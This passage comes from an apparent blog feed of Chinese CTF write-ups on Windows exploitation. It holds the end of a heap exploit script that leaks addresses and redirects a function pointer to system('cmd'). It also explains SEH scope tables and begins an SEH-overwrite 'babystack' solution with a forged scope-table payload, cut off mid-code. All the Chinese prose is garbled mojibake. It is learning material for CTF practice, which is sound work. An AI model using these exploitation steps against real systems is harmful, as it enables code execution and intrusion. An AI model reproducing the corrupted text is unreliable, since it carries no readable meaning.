class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">p = run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;option &gt;\r\n&#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size &gt;\r\n&#x27;</span>,tbs(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index &gt;\r\n&#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index &gt;\r\n&#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index &gt;\r\n&#x27;</span>,tbs(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;content  &gt;\r\n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">32</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">32</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">32</span>) <span class="comment">#2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_base = u32(ru(<span class="string">b&quot;\r\n&quot;</span>, drop=<span class="literal">True</span>)[:<span class="number">4</span>])-<span class="number">0x550</span></span><br><span class="line"></span><br><span class="line">leak(<span class="string">&quot;heap_base&quot;</span>,heap_base)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p32(heap_base+<span class="number">0x4A4</span>-<span class="number">4</span>)+p32(heap_base+<span class="number">0x4A4</span>))</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">pause()</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">image_base=u32(ru(<span class="string">b&quot;\r\n&quot;</span>, drop=<span class="literal">True</span>)[:<span class="number">4</span>])-<span class="number">0x1043</span></span><br><span class="line">leak(<span class="string">&quot;image_base&quot;</span>,image_base)</span><br><span class="line"></span><br><span class="line">puts_iat = image_base + <span class="number">0x20c4</span></span><br><span class="line">edit(<span class="number">1</span>, p32(puts_iat)+p32(<span class="number">0</span>)+p32(heap_base+<span class="number">0x4A4</span>));show(<span class="number">1</span>)             </span><br><span class="line">ucrt_base = u32(r(<span class="number">4</span>))-<span class="number">0xb89f0</span></span><br><span class="line">log.warn(<span class="string">&quot;ucrt_base:&quot;</span> + <span class="built_in">hex</span>(ucrt_base))</span><br><span class="line">system = ucrt_base+<span class="number">0xefda0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># modify func pointer to system and tigger it</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;cmd\x00&#x27;</span>)                                             </span><br><span class="line">edit(<span class="number">2</span>, p32(system)+p32(heap_base+<span class="number">0x6D0</span>))                         </span><br><span class="line">show(<span class="number">0</span>)                                                          </span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><blockquote><p>ä¸è¿‡æˆ‘åœ¨ä¹¦å†™è„šæœ¬çš„æ—¶å€™ï¼Œå‘ç°unlinkçš„æ—¶å€™ï¼Œå¾—åœ¨x32dbgé™„åŠ è°ƒè¯•æ‰èƒ½è¿‡å¾—å»freeï¼ˆä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼‰</p></blockquote><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.slideshare.net/slideshow/windows-10-nt-heap-exploitation-chinese-version/154047090">angel boy</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/07/09/winpwn/">xuanxuanblingbling</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;windowså †åŸºç¡€çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#windowså †åŸºç¡€çŸ¥è¯†&quot; class=&quot;headerlink&quot; title=&quot;windowså †åŸºç¡€çŸ¥è¯†&quot;&gt;&lt;/a&gt;windowså †åŸºç¡€çŸ¥è¯†&lt;/h2&gt;&lt;p&gt;win10çš„memory allocatoråŸºæœ¬ä¸Šåˆ†ä¸ºä¸¤ç§ï¼š</summary>
      
    
    
    
    <category term="windows" scheme="http://s1nec-1o.github.io/categories/windows/"/>
    
    <category term="heap" scheme="http://s1nec-1o.github.io/categories/windows/heap/"/>
    
    
    <category term="windows pwn" scheme="http://s1nec-1o.github.io/tags/windows-pwn/"/>
    
  </entry>
  
  <entry>
    <title>windows pwnåˆæ¢(1)</title>
    <link href="http://s1nec-1o.github.io/2025/05/08/windows-pwn%E5%88%9D%E6%8E%A2-1/"/>
    <id>http://s1nec-1o.github.io/2025/05/08/windows-pwn%E5%88%9D%E6%8E%A2-1/</id>
    <published>2025-05-08T06:27:53.000Z</published>
    <updated>2025-05-10T07:19:40.999Z</updated>
    
    <content type="html"><![CDATA[<h1 id="window-pwn"><a href="#window-pwn" class="headerlink" title="window_pwn"></a>window_pwn</h1><p><a href="https://www.anquanke.com/post/id/188170#h3-1">https://www.anquanke.com/post/id/188170#h3-1</a></p><h2 id="SEHç›¸å…³æ•°æ®ç»“æ„"><a href="#SEHç›¸å…³æ•°æ®ç»“æ„" class="headerlink" title="SEHç›¸å…³æ•°æ®ç»“æ„"></a>SEHç›¸å…³æ•°æ®ç»“æ„</h2><h3 id="TIBç»“æ„"><a href="#TIBç»“æ„" class="headerlink" title="TIBç»“æ„"></a>TIBç»“æ„</h3><p><code>TIB</code>ï¼Œå³çº¿ç¨‹ä¿¡æ¯å—ï¼Œæ˜¯ä¿å­˜çº¿ç¨‹åŸºæœ¬ä¿¡æ¯çš„æ•°æ®ç»“æ„ï¼Œå®ƒä½äº<code>TEB</code>çš„å¤´éƒ¨ã€‚<code>TEB</code>æ˜¯æ“ä½œç³»ç»Ÿä¸ºäº†ä¿å­˜æ¯ä¸ªçº¿ç¨‹çš„æ•°æ®åˆ›å»ºçš„ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„<code>TEB</code>ã€‚</p><p>TIBç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Exceptionlist</span>;</span><span class="comment">//æŒ‡å‘å¼‚å¸¸å¤„ç†é“¾è¡¨</span></span><br><span class="line">    PVOID StackBase;<span class="comment">//å½“å‰è¿›ç¨‹æ‰€ä½¿ç”¨çš„æ ˆçš„æ ˆåº•</span></span><br><span class="line">    PVOID StackLimit;<span class="comment">//å½“å‰è¿›ç¨‹æ‰€ä½¿ç”¨çš„æ ˆçš„æ ˆé¡¶</span></span><br><span class="line">    PVOID SubSystemTib;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        PVOID FiberData;</span><br><span class="line">        ULONG Version;</span><br><span class="line">    &#125;;</span><br><span class="line">    PVOID ArbitraryUserPointer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span><span class="comment">//æŒ‡å‘TIBç»“æ„è‡ªèº«</span></span><br><span class="line">&#125; NT_TIB;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªç»“æ„ä¸­ä¸å¼‚å¸¸å¤„ç†æœ‰å…³çš„ç¬¬ä¸€ä¸ªæˆå‘˜ï¼šæŒ‡å‘<code>_EXCEPTION_REGISTRATION_RECORD</code>ç»“æ„çš„<code>Exceptionlist</code>æŒ‡é’ˆ</p><h3 id="EXCEPTION-REGISTRATION-RECORD-ç»“æ„"><a href="#EXCEPTION-REGISTRATION-RECORD-ç»“æ„" class="headerlink" title="_EXCEPTION_REGISTRATION_RECORD ç»“æ„"></a>_EXCEPTION_REGISTRATION_RECORD ç»“æ„</h3><p>è¯¥ç»“æ„ä¸»è¦ç”¨äºæè¿°çº¿ç¨‹å¼‚å¸¸å¤„ç†è¿‡ç¨‹çš„åœ°å€ï¼Œè¯¥ç»“æ„çš„é“¾è¡¨æè¿°äº†å¤šä¸ªçº¿ç¨‹å¼‚å¸¸å¤„ç†è¿‡ç¨‹çš„å±‚æ¬¡å…³ç³»</p><p>ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Next</span>;</span><span class="comment">//æŒ‡å‘ä¸‹ä¸€ä¸ªç»“æ„çš„æŒ‡é’ˆ</span></span><br><span class="line">    PEXCEPTION_ROUTINE Handler;<span class="comment">//å½“å‰å¼‚å¸¸å¤„ç†å›è°ƒå‡½æ•°çš„åœ°å€</span></span><br><span class="line">&#125;EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure><p>ç»“æ„å¦‚å›¾æ‰€ç¤ºï¼š</p><img src="https://s2.ax1x.com/2019/10/09/uI9Auq.png" alt="img" style="zoom: 67%;" /><p>æ ¼å¼åŒ–ä¹‹åçš„è¿™ä¸ªç»“æ„ä½“ä¸­çš„<code>*Next</code>å¿…é¡»æ˜¯åŸæ¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦äº‹å…ˆæ³„éœ²å‡ºæ¥åŸ<code>*Next</code></p><h3 id="SEHèŒƒå›´è¡¨ç»“æ„"><a href="#SEHèŒƒå›´è¡¨ç»“æ„" class="headerlink" title="SEHèŒƒå›´è¡¨ç»“æ„"></a>SEHèŒƒå›´è¡¨ç»“æ„</h3><p>åœ¨Scopeè¡¨ä¸­ä¿å­˜äº†<code>__try</code>å—ç›¸åŒ¹é…çš„<code>__except</code>æˆ–<code>__finally</code>çš„åœ°å€å€¼<br>ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_EH4_SCOPETABLE</span> &#123;</span><br><span class="line">        DWORD GSCookieOffset;</span><br><span class="line">        DWORD GSCookieXOROffset;</span><br><span class="line">        DWORD EHCookieOffset;</span><br><span class="line">        DWORD EHCookieXOROffset;</span><br><span class="line">        _EH4_SCOPETABLE_RECORD ScopeRecord[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_EH4_SCOPETABLE_RECORD</span> &#123;</span><br><span class="line">        DWORD EnclosingLevel;</span><br><span class="line">        <span class="built_in">long</span> (*FilterFunc)();</span><br><span class="line">            <span class="keyword">union</span> &#123;</span><br><span class="line">            <span class="built_in">void</span> (*HandlerAddress)();</span><br><span class="line">            <span class="built_in">void</span> (*FinallyFunc)(); </span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>windows pwnçš„å…³é”®å°±æ˜¯ä¼ªé€ <code>scope table</code>ç»“æ„ä½“ï¼Œå®ƒçš„åœ°å€ä½äºæ ˆä¸Šçš„ä½ç½®åœ¨<code>ebp-0x8</code>ï¼Œå­˜å…¥çš„å€¼æ˜¯å’Œ<code>___security_cookie</code>å¼‚æˆ–è€…ä¹‹åçš„ç»“æœï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ªé€ å®ƒï¼Œå°±å¿…é¡»å…ˆæ³„éœ²å‡ºæ¥<code>___security_cookie</code>çš„å€¼</p><p>å½“ç¨‹åºè§¦å‘å¼‚å¸¸åï¼Œä¼šæ‰§è¡Œç±»ä¼¼è¿™æ ·çš„ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00401B50                 push    ebp</span><br><span class="line">.text:00401B51                 mov     ebp, esp</span><br><span class="line">.text:00401B53                 mov     eax, [ebp+arg_C]</span><br><span class="line">.text:00401B56                 push    eax</span><br><span class="line">.text:00401B57                 mov     ecx, [ebp+arg_8]</span><br><span class="line">.text:00401B5A                 push    ecx</span><br><span class="line">.text:00401B5B                 mov     edx, [ebp+arg_4]</span><br><span class="line">.text:00401B5E                 push    edx</span><br><span class="line">.text:00401B5F                 mov     eax, [ebp+arg_0]</span><br><span class="line">.text:00401B62                 push    eax</span><br><span class="line">.text:00401B63                 push    offset j_@__security_check_cookie@4 ; __security_check_cookie(x)</span><br><span class="line">.text:00401B68                 push    offset ___security_cookie</span><br><span class="line">.text:00401B6D                 call    _except_handler4_common</span><br><span class="line">.text:00401B72                 add     esp, 18h</span><br><span class="line">.text:00401B75                 pop     ebp</span><br><span class="line">.text:00401B76                 retn</span><br><span class="line">.text:00401B76 SEH_4013A0      endp</span><br></pre></td></tr></table></figure><p>è°ƒç”¨äº†<code>_except_handler4_common</code>å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl _except_handler4_common(<span class="type">unsigned</span> <span class="type">int</span> *securityCookies, <span class="type">void</span> (__fastcall *cookieCheckFunction)(<span class="type">unsigned</span> <span class="type">int</span>), _EXCEPTION_RECORD *exceptionRecord, <span class="type">unsigned</span> __int32 sehFrame, _CONTEXT *context)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// å¼‚æˆ–è§£å¯† scope table</span></span><br><span class="line">    scopeTable_1 = (_EH4_SCOPETABLE *)(*securityCookies ^ *(_DWORD *)(sehFrame + <span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sehFrame ç­‰äº ä¸Šå›¾ ebp - 10h ä½ç½®, framePointer ç­‰äºä¸Šå›¾ ebp çš„ä½ç½®</span></span><br><span class="line">    framePointer = (<span class="type">char</span> *)(sehFrame + <span class="number">16</span>);</span><br><span class="line">    scopeTable = scopeTable_1;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éªŒè¯ GS</span></span><br><span class="line">    ValidateLocalCookies(cookieCheckFunction, scopeTable_1, (<span class="type">char</span> *)(sehFrame + <span class="number">16</span>));</span><br><span class="line">    __except_validate_context_record(context);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( exceptionRecord-&gt;ExceptionFlags &amp; <span class="number">0x66</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        exceptionPointers.ExceptionRecord = exceptionRecord;</span><br><span class="line">        exceptionPointers.ContextRecord = context;</span><br><span class="line">        tryLevel = *(_DWORD *)(sehFrame + <span class="number">12</span>);</span><br><span class="line">        *(_DWORD *)(sehFrame - <span class="number">4</span>) = &amp;exceptionPointers;</span><br><span class="line">        <span class="keyword">if</span> ( tryLevel != <span class="number">-2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                v8 = tryLevel + <span class="number">2</span> * (tryLevel + <span class="number">2</span>);</span><br><span class="line">                filterFunc = (<span class="type">int</span> (__fastcall *)(_DWORD, _DWORD))*(&amp;scopeTable_1-&gt;GSCookieXOROffset + v8);</span><br><span class="line">                scopeTableRecord = (_EH4_SCOPETABLE_RECORD *)((<span class="type">char</span> *)scopeTable_1 + <span class="number">4</span> * v8);</span><br><span class="line">                encloseingLevel = scopeTableRecord-&gt;EnclosingLevel;</span><br><span class="line">                scopeTableRecord_1 = scopeTableRecord;</span><br><span class="line">                <span class="keyword">if</span> ( filterFunc )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// è°ƒç”¨ FilterFunc</span></span><br><span class="line">                    filterFuncRet = _EH4_CallFilterFunc(filterFunc);</span><br><span class="line">                    ......</span><br><span class="line">                    <span class="keyword">if</span> ( filterFuncRet &gt; <span class="number">0</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                        ......</span><br><span class="line">                        <span class="comment">// è°ƒç”¨ HandlerFunc</span></span><br><span class="line">                        _EH4_TransferToHandler(scopeTableRecord_1-&gt;HandlerFunc, v5 + <span class="number">16</span>);</span><br><span class="line">                        ......</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                ......</span><br><span class="line">                tryLevel = encloseingLevel;</span><br><span class="line">                <span class="keyword">if</span> ( encloseingLevel == <span class="number">-2</span> )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                scopeTable_1 = scopeTable;</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨å‡½æ•°ä¸­å‰ç½®è°ƒç”¨äº†<code>scope table</code>ç»“æ„ä½“ä¸­çš„<code>FilterFunc</code>å‡½æ•°å’Œ<code>HandlerFunc</code>å‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†è¿™ä¸¤ä¸ªå‡½æ•°åœ°å€å¤åˆ¶ä¸ºæˆ‘ä»¬çš„shellä»£ç ï¼Œå½“è§¦å‘å¼‚å¸¸æ—¶å°±ä¼šæ‰§è¡Œshellä»£ç ï¼Œå³å¯è·å–åˆ°shell</p><h3 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h3><p>é€šè¿‡æŸ¥çœ‹æˆ‘ä»¬å‘ç°åœ¨æ ˆä¸Šè¿˜æœ‰ä¸€ä¸ªç‰¹æ®Šçš„å€¼ï¼Œä½ç½®åœ¨<code>ebp-0x1c</code>å¤„</p><p><img src="https://s2.ax1x.com/2019/10/09/uIFey9.png" alt="img"></p><p>è€Œ<code>scope table</code>ç»“æ„ä½“åœ°å€åœ¨å®ƒçš„ä¸‹é¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»è¿˜è¦æ ¼å¼åŒ–è¿™ä¸ªå€¼ã€‚æ ¼å¼åŒ–å®ƒç”±ä¸¤ç§æ–¹æ³•ç»„æˆï¼Œç¬¬ä¸€ç§æ¶ˆè€—æ‰å‡ºå»ï¼Œæ„é€ payloadçš„æ—¶å€™å†å¡«å……è¿›å»å³å¯ï¼›å¦ä¸€ç§æ–¹æ³•å°±æ˜¯è®¡ç®—å‡ºæ¥ï¼š<code>å€¼=___security_cookie^ebp</code></p><blockquote><p>æ„Ÿè§‰è¯´è¿™ä¹ˆå¤šç†è®ºçš„ä¹Ÿä¸æ˜¯å¾ˆèƒ½ç†è§£ï¼Œé‚åšç‚¹é¢˜æ¥ç†è§£ç†è§£</p><p>ä¸è¿‡åœ¨64ä½ä¸‹çš„SEHç»“æ„ä½“å°±ä¸åœ¨æ ˆä¸Šäº†ï¼Œåˆ©ç”¨ä¼šæ›´åŠ å›°éš¾</p></blockquote><h2 id="windowä¸‹ASLRçš„è„†å¼±æ€§ï¼š"><a href="#windowä¸‹ASLRçš„è„†å¼±æ€§ï¼š" class="headerlink" title="windowä¸‹ASLRçš„è„†å¼±æ€§ï¼š"></a>windowä¸‹ASLRçš„è„†å¼±æ€§ï¼š</h2><p><a href="https://www.morphisec.com/blog/aslr-what-it-is-and-what-it-isnt/">https://www.morphisec.com/blog/aslr-what-it-is-and-what-it-isnt/</a></p><ol><li>DLLçš„åŸºåœ°å€åŸºäºå¯åŠ¨æ—¶éšæœºåŒ–ï¼ŒDLLçš„åŸºåœ°å€åªåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶ä¼šéšæœºåŒ–ï¼Œå› æ­¤åªéœ€ç»“åˆå†…å­˜æ³„éœ²æˆ–æš´åŠ›ç ´è§£ç­‰æ¼æ´å³å¯åˆ©ç”¨</li><li>ASLRä¸æä¾›æœ‰å…³æ”»å‡»çš„ä¿¡æ¯ã€å‘ç”Ÿæ”»å‡»æ—¶ASLRä¸ä¼šå‘å‡ºè­¦æŠ¥</li><li>åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ– (ASLR) æ—¨åœ¨é˜»æ­¢æ”»å‡»å¯é åœ°åˆ°è¾¾å…¶ç›®æ ‡å†…å­˜åœ°å€ã€‚ASLR çš„é‡ç‚¹å¹¶éåœ¨äºæ•è·æ”»å‡»ï¼Œè€Œæ˜¯åœ¨äºä½¿æ”»å‡»éš¾ä»¥å¾—é€ã€‚</li><li>å¦‚æœå¯æ‰§è¡Œæ–‡ä»¶æˆ– DLL æ–‡ä»¶æœªå¯ç”¨ ASLR æ”¯æŒï¼Œåˆ™ä¸æ”¯æŒASLRã€‚</li></ol><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><h3 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h3><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505081433006.png" alt="image-20250506202655846"></p><p>ç¨‹åºä¸­æœ‰ç€10æ¬¡çš„æ³„éœ²æ•°æ®ï¼Œä»¥åŠç»™äº†mainå’Œæ ˆçš„åœ°å€ï¼Œå¹¶ä¸”æœ‰ç€ä¸€ä¸ªæ ˆæº¢å‡ºçš„æ¼æ´</p><p>å› æ­¤è€ƒè™‘è¦†ç›–SEHç»“æ„ä½“ä»¥è¾¾åˆ°getshellçš„ç›®çš„</p><p>æ”»å‡»æµç¨‹ï¼š</p><ul><li><p>æ³„éœ²<code>__security_cookie</code>ï¼Œä»–çš„åœ°å€æ˜¯<code>main_addr+0x2f54</code>ï¼›ç„¶åæ³„éœ²<code>_EXCEPTION_REGISTRATION_RECORD</code>ç»“æ„ä½“ä¸­<code>Next</code>æˆå‘˜ï¼Œé€šè¿‡x32dbgè°ƒè¯•å¯ä»¥å‘ç°åœ¨ebp-0x10çš„ä½ç½®å°±æ˜¯nextå­—æ®µ</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505081433007.png" alt="image-20250506214348433" style="zoom:33%;" /><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ª<code>RECORD</code>ç»“æ„ä½“æ˜¯å­˜å‚¨åœ¨æ ˆä¸Šçš„ï¼›ç„¶åçœ‹åˆ°ED0çš„ä½ç½®ï¼Œä¾¿æ˜¯GSå³<code>ebp-0x1c</code>çš„ä½ç½®</p></li><li><p>æ ¼å¼<code>hardler</code>ç»“æ„ä½“</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SEH_scope_table = p32(<span class="number">0x0FFFFFFE4</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFF20</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFFFE</span>)</span><br><span class="line">SEH_scope_table += p32(shell_addr)</span><br></pre></td></tr></table></figure><ul><li>é€šè¿‡æ ˆæº¢å‡ºå¯¹å†…å­˜è¿›è¡Œè¦†ç›–ï¼Œä½¿ç¨‹åºå¼‚å¸¸æ¥è§¦å‘æ‰§è¡ŒåŸå§‹çš„ä»£ç æ®µï¼ˆè®¿é—®éæ³•å†…å­˜ä¹‹ç±»çš„ï¼Œç†è®ºä¸Šæ¥è¯´æˆ‘å¯ä»¥æŠŠè¿”å›åœ°å€å¡«æ»¡<code>null</code>ï¼Œé‚£ä¹ˆ<code>0x0000000</code>å¤„æ— æ³•è®¿é—®ï¼Œä¼šè§¦å‘<code>SHE</code>ï¼›ä½†æ˜¯è¿™é¢˜å¯ä»¥ç›´æ¥è®¿é—®éæ³•çš„å†…å­˜ï¼‰</li></ul><p>è¿™é‡Œæœ‰ä¸ªæ¯”è¾ƒå®¹æ˜“å‡ºé”™çš„ç‚¹å°±æ˜¯åœ¨v9ä¸€å¼€å§‹çš„4ä¸ªå­—èŠ‚ä¹‹åä¼šè¢«è¦†ç›–ï¼Œå› æ­¤è¦å…ˆç”¨<code>b&#39;aaaa&#39;</code>å¡«å……</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span 